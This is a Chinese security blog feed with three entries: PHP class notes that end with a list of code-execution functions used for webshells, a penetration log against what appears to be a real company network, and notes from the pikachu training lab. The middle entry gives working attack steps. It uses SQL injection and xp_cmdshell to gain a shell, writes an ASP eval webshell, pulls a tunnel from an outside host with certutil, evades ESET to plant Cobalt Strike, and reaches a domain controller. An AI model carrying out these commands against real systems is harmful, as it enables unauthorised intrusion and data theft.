static(静态)，就可以不实例化类而直接访问。</p><p>静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。</p><p>由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。</p><p>静态属性不可以由对象通过 -&gt; 操作符来访问。</p><p>自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字 self，parent 或 static。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> $my_static = <span class="string">'foo'</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">staticValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">self</span>::$my_static;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> Foo::$my_static . PHP_EOL;</span><br><span class="line">$foo = <span class="keyword">new</span> Foo();</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $foo-&gt;staticValue() . PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行以上程序，输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo</span><br><span class="line">foo</span><br></pre></td></tr></table></figure><hr><h2 id="Final-关键字"><a href="#Final-关键字" class="headerlink" title="Final 关键字"></a>Final 关键字</h2><p>PHP 5 新增了一个 final 关键字。如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。</p><p>以下代码执行会报错：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"BaseClass::test() called"</span> . PHP_EOL;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moreTesting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"BaseClass::moreTesting() called"</span>  . PHP_EOL;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChildClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moreTesting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"ChildClass::moreTesting() called"</span>  . PHP_EOL;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 报错信息 Fatal error: Cannot override final method BaseClass::moreTesting()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="调用父类构造方法"><a href="#调用父类构造方法" class="headerlink" title="调用父类构造方法"></a>调用父类构造方法</h2><p>PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 <strong>parent::__construct()</strong> 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">print</span> <span class="string">"BaseClass 类中构造方法"</span> . PHP_EOL;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">parent</span>::__construct();  <span class="comment">// 子类构造方法不能自动调用父类的构造方法</span></span><br><span class="line">       <span class="keyword">print</span> <span class="string">"SubClass 类中构造方法"</span> . PHP_EOL;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OtherSubClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 继承 BaseClass 的构造方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 BaseClass 构造方法</span></span><br><span class="line">$obj = <span class="keyword">new</span> BaseClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 BaseClass、SubClass 构造方法</span></span><br><span class="line">$obj = <span class="keyword">new</span> SubClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 BaseClass 构造方法</span></span><br><span class="line">$obj = <span class="keyword">new</span> OtherSubClass();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行以上程序，输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BaseClass 类中构造方法</span><br><span class="line">BaseClass 类中构造方法</span><br><span class="line">SubClass 类中构造方法</span><br><span class="line">BaseClass 类中构造方法</span><br></pre></td></tr></table></figure><h1 id="PHP代码执行函数总结"><a href="#PHP代码执行函数总结" class="headerlink" title="PHP代码执行函数总结"></a><a href="https://www.cnblogs.com/xiaozi/p/7834367.html">PHP代码执行函数总结</a></h1><p>　　PHP中可以执行代码的函数，常用于编写一句话木马，可能导致代码执行漏洞，这里对代码执行函数做一些归纳。</p><p>　　常见代码执行函数，如  </p><p>　　　　eval()、assert()、preg_replace()、create_function()</p><p>　　　　array_map()、call_user_func()、call_user_func_array()，array_filter，usort，uasort()</p><p>　　　　文件操作函数、动态函数（$a($b)）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做笔记，以免忘记。&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="/categories/PHP/"/>
    
    
      <category term="PHP" scheme="/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>由一句“内网见”引发的内网渗透</title>
    <link href="/2019/04/15/%E7%94%B1%E4%B8%80%E5%8F%A5%E2%80%9C%E5%86%85%E7%BD%91%E8%A7%81%E2%80%9D%E5%BC%95%E5%8F%91%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>/2019/04/15/由一句“内网见”引发的内网渗透/</id>
    <published>2019-04-15T04:00:00.000Z</published>
    <updated>2019-04-24T13:17:44.218Z</updated>
    
    <content type="html"><![CDATA[<p>师兄在练手的一个站，把主站扔了出来，说了一声内网见。</p><a id="more"></a><h2 id="前期信息采集"><a href="#前期信息采集" class="headerlink" title="前期信息采集"></a>前期信息采集</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>没搜集到什么有用的信息。</p><h3 id="收集目标ip"><a href="#收集目标ip" class="headerlink" title="收集目标ip"></a>收集目标ip</h3><p>尝试ping查看ip。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/1.png" class="lazyload"></p><p>出现ip，在浏览器中添加ip+80端口访问试试。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/2.png" class="lazyload"><br>能正常访问，真实ip没跑了。</p><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Nmap扫一波端口，万一有可直接getshell的漏洞呢（例如445，永恒之蓝漏洞）<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/3.png" class="lazyload"><br>只开了80,443端口<br>IIS7.5,Windows系统，asp语言</p><h3 id="旁站收集"><a href="#旁站收集" class="headerlink" title="旁站收集"></a>旁站收集</h3><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/4.png" class="lazyload"><br>同ip下没什么旁站了，就开始动手了。</p><h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>随便看了看一些界面，手工检测一下是否存在漏洞。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/5.png" class="lazyload"></p><p>有传参，测试一下。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/6.png" class="lazyload"><br>单引号’闭合，and 1=1判断，- -注释sql语句后面的字符。<br>返还结果正常。</p><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/7.png" class="lazyload"><br>and 1=2，返还结果。<br>典型的布尔注入。</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>直接扔sqlmap<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/8.png" class="lazyload"><br>结果出来了。<br>得到更深一步信息（系统：Windows2008 R2，数据库：SqlServer 2008）。</p><p>查看是否是dba权限（我习惯存在注入第一件事是就是判断是否是dba权限，因为如果是，进程就进了很大一步）。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/9.png" class="lazyload"><br>运气真好！</p><h4 id="sql注入-os-shell"><a href="#sql注入-os-shell" class="headerlink" title="sql注入 os-shell"></a>sql注入 os-shell</h4><p>本地执行–os-shell的时候可能是延迟太高了吧，跑着跑着就返还web状态码500。<br>这时候我只能分两步进行了，我在本地返还sql-shell没问题，后来我在vps跑os-shell没问题。</p><p>这时候分两步讲了，我开始只有sql-shell，师兄说dba注入点 无非就三条路，第一 找密码进后台 第二 直接写shell 第三 dump密码链接数据库（开启外联）。</p><p>写shell最直接快捷了，</p><ol><li>创建临时表 </li></ol><pre><code>http://www.xxxx.com/detail.asp?Prod=085500528&apos;;CREATE TABLE tt_tmp (tmp1 varchar(8000));--</code></pre><p>这步也可以在浏览器执行，不过是布尔注入，没有报错注入的回显，就不知道是否完成创表操作，所以我在sql—shell执行，有回显。以下操作同理，在浏览器执行数据库操作的时候只要做好闭合和注释就可以。<br>在sql-shell执行就像对数据库操作一样的语句：</p><pre><code>CREATE TABLE tt_tmp (tmp1 varchar(8000))</code></pre><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/10.png" class="lazyload"></p><ol start="2"><li>开启xp_cmdshell<br>可能是我执行–os-shell的时候已经开启了，只是没有弹shell回来，但是我可以跳过这一步。</li><li>遍历文件夹查询特殊的asp文件（web端显示的文件名），插入表中，获取网站物理路径。</li></ol><pre><code>insert into tt_tmp(tmp1) exec master..xp_cmdshell &apos;for /r d:\ %i in (detail*.aspx) do @echo %i &apos;</code></pre><p>后面这句命令</p><pre><code>for /r d:\ %i in (detail*.aspx) do @echo %i </code></pre><p>在Windows执行的效果是这样的。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/11.png" class="lazyload"><br>他会遍历整个文件夹，查找匹配的文件名输出。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/12.png" class="lazyload"></p><p>结果出来了，不过这里我犯了一个错误，只是我后来才发现的，因为延迟太高，我没等所有结果都出来，就直接停止，我以为这就是物理路径。导致我后来写shell的时候一直访问不到。</p><ol start="4"><li><p>执行xp_cmdshell写一句话木马<br>这步还没进行，我vps的os-shell就弹回来了。</p></li><li><p>os-shell<br>os-shell回来以后，我直接写一句话木马，但是不解析，于是我又执行了一次这条命令。</p></li></ol><pre><code>for /r d:\ %i in (detail*.aspx) do @echo %i </code></pre><p>这时候网站真实的物理路径出来了。<br>d:\XXXXX\</p><p>二话不说，写马。</p><pre><code>echo ^&lt;%eval request(&quot;sb&quot;)%^&gt; &gt;d:\XXXXX\XXXXX.asp</code></pre><p><strong><em>这里有点小建议，当我们执行一些命令的时候可以现在本地尝试，我在这次渗透过程中就犯了这样的错误，我直接将命令执行，提示错误，有的时候我总觉得是那边的问题，其实我本身的命令就已经出错了。这里是重点。</em></strong></p><p>这里的^是因为&gt;在cmd命令不能直接执行需要^注释一下。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/13.png" class="lazyload"></p><p>后来师兄说也可以将命令写在””内就可以。</p><pre><code>echo &quot;&lt;%eval request(&quot;sb&quot;)%&gt;&quot; &gt;d:\XXXXX\XXXXXX.asp</code></pre><p>这马一写上就被秒杀了，于是我用了一个大小写混合的马。就免杀了。<del>（这种杀软还真是low，其实我也挺low的。）</del><br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/14.png" class="lazyload"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>一句话木马也上了，os-shell也是最高权限了，这台机器也算拿下了。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/15.png" class="lazyload"><br>web渗透算是告一段落了。</p><p>因为其实我也不是很会内网渗透吧，这次算是第一次认真的内网渗透。所以我的思路就是先搭建代理，然后在搞。</p><p><strong><em>虽然我没搞过内网渗透，但是我牢牢记住了大佬的一句话，内网渗透的本质是信息收集。</em></strong></p><h3 id="代理搭建"><a href="#代理搭建" class="headerlink" title="代理搭建"></a>代理搭建</h3><p>本想直接小马的权限上传reGeorg进行代理。小马的权限真是低得可怜。无上传权限，无修改权限。连命令有些都不能执行。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/16.png" class="lazyload"></p><p>这时候我脑海浮起了师兄说得那句话：权限至高无上。<br>嘴角45°上扬，泛起了一抹微笑。<del>2333333333333</del><br>我的sql的xp_cmdshell是最高权限。<br>我用一句下载命令将我的代理文件下载到了web中：</p><pre><code>certutil -urlcache -split -f http://xxxxxxx.com/tunnel.aspx d:\XXXXX\tunnel.aspx</code></pre><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/17.png" class="lazyload"><br>reGeorg+proxychains内网渗透走起！！！</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>本来应该先查看系统关于内网的基本信息，但是我在翻找网站配置文件的时候，收获到意外发现。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/18.png" class="lazyload"></p><p>两个数据库的账号密码。<del>虽然我也不知道他为什么连两个数据库。</del><br>当前系统的ip是10.1.1.2</p><p>尝试一下连接10.1.1.1数据库。看看能不能连上.<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/19.png" class="lazyload"></p><p>可以连上，尝试连接过去开启xp_cmdshell,然后查看权限。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/20.png" class="lazyload"></p><p><strong>第二台。拿下</strong></p><p>这样就拿下两台了，接下来得开启我漫长的内网渗透之旅了。<br>开始内网的基本信息收集。自己对内网不是很了解，只好找找文章，看看别人的思路了。<br>翻阅很多篇文章，我觉得有篇文章思路很适合现在该目标的渗透测试。</p><p><strong><em>域渗透的思路就是：通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。<br>                                                                    ——摘抄自<a href="https://www.freebuf.com/company-information/172630.html" title="干货！内网渗透测试之域渗透详解！收藏！">干货！内网渗透测试之域渗透详解！收藏！</a></em></strong></p><h4 id="小小免杀（插曲）"><a href="#小小免杀（插曲）" class="headerlink" title="小小免杀（插曲）"></a>小小免杀（插曲）</h4><p>查看进程的时候发现存在的杀软是ESET杀软，所以尝试过一下免杀。</p><p>我打算上一个Cobalt Strike的shell过去，这样可以更好的进行内网渗透。做个小小的捆绑免杀，<a href="https://www.youtube.com/watch?v=ykwcG7dXrmE" title="教程">教程</a>是学长分享的。</p><p>本地测试没问题。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/24.png" class="lazyload"></p><p>注入到资源管理器进程后，会有一个新的会话产生，关闭putty.exe进程，也不影响控制。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/25.png" class="lazyload"></p><p><strong>Cobalt Strike检测结果：</strong></p><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/29.png" class="lazyload"></p><p>能过杀软的文件检测。</p><p><strong>Cobalt Strike本地杀软检测：</strong><br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/30.png" class="lazyload"><br>会话弹回，无杀软提示。</p><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/31.png" class="lazyload"><br>翻阅文件夹时，出现杀软提示。</p><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/32.png" class="lazyload"><br>会话丢失。</p><p>后来学长说msfconsole的shell，可以过该杀软的检测。我便开始继续着手本地复现。<br><a href="https://blog.csdn.net/sufeiboy/article/details/65939342" title="教程">教程</a></p><p><strong>msfconsole检测结果：</strong><br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/28.png" class="lazyload"><br>依旧能过杀软文件检测。</p><p><strong>msfconsole本地杀软检测：</strong><br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/33.png" class="lazyload"><br>本地运行，直接提示，会话都弹不回来，我都懵逼了。</p><p>这时候，我就只能动用特殊方法了。<del>（一阵操作之后）</del></p><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/34.png" class="lazyload"><br>ok！ Cobalt Strike的shell弹回来了。</p><h4 id="开始信息搜集"><a href="#开始信息搜集" class="headerlink" title="开始信息搜集"></a>开始信息搜集</h4><p><strong>10.1.1.2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/41.png" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname     当前主机名</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/35.png" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain    当前域</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/36.png" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>想看一下dns，一般来说（特殊情况除外），dns的地址是域控的ip地址。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/37.png" class="lazyload"><br>ping的时候没有出现ip地址。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/38.png" class="lazyload"><br><del>其实应该是乱码吧。</del></p><p>在网上找到一个方法可以确定域控ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery server</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/39.png" class="lazyload"></p><p>但是在目标上执行不成功。就放弃了。</p><p><strong>10.1.1.1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/42.png" class="lazyload"></p><p>出现意外发现。<br><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/43.png" class="lazyload"></p><p>竟然是台域控机器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain    当前域</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/44.png" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view   #显示当前域或工作组中计算机的列表</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/45.png" class="lazyload"><br>自此，内网渗透的一部分已经结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>其实旁站搜集的时候没有做的完全，师兄说这是一个很大的内网，很大的公司，他买下了多个ip段，C段有好几个web也都是他们</li><li>内网部分存在多个域，我拿下的只是其中一个域。</li><li>很多操作尽量做好本地测试以后再进行实际操作，可以减少误解。</li></ol><h1 id="——未完待续——"><a href="#——未完待续——" class="headerlink" title="——未完待续——"></a>——未完待续——</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;师兄在练手的一个站，把主站扔了出来，说了一声内网见。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透日志" scheme="/categories/%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/"/>
    
    
      <category term="渗透" scheme="/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>靶场练习-4</title>
    <link href="/2019/03/11/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-4/"/>
    <id>/2019/03/11/靶场练习-4/</id>
    <published>2019-03-10T16:00:00.000Z</published>
    <updated>2019-04-27T07:55:26.861Z</updated>
    
    <content type="html"><![CDATA[<p>在pikachu靶场练习一下，复习一下漏洞。</p><a id="more"></a><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。<br>序列化serialize()<br>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:<br>pikachu:变量值</p><pre><code>class S{    public $test=&quot;pikachu&quot;;}$s=new S(); //创建一个对象serialize($s); //把这个对象进行序列化序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:{s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;}    O:代表object    1:代表对象名字长度为一个字符    S:对象的名称    1:代表对象里面有一个变量    s:数据类型    4:变量名称的长度    test:变量名称    s:数据类型    7:变量值的长度</code></pre><p>反序列化unserialize()</p><p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$u=unserialize(<span class="string">"O:1:"</span>S<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:7:"</span>pikachu<span class="string">";&#125;"</span>);</span><br><span class="line">    <span class="keyword">echo</span> $u-&gt;test; <span class="comment">//得到的结果为pikachu</span></span><br></pre></td></tr></table></figure><p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">        __construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">        __destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">        __toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">        __sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">        __wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">        漏洞举例:</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">            <span class="keyword">var</span> $test = <span class="string">"pikachu"</span>;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $s = $_GET[<span class="string">'test'</span>];</span><br><span class="line">        @$unser = unserialize($a);</span><br><span class="line"></span><br><span class="line">        payload:O:<span class="number">1</span>:<span class="string">"S"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">29</span>:<span class="string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE -“xml external entity injection”<br>既”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p><p>具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。<br>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<br>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p><p>本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。 </p><h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><p>不安全的url跳转</p><p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。<br>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话<br>就可能发生”跳错对象”的问题。</p><p>url跳转比较直接的危害是:<br>–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)</p><p>其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制<br>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p><p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p><p>根据后台使用的函数的不同,对应的影响和利用方法又有不一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure><p>​            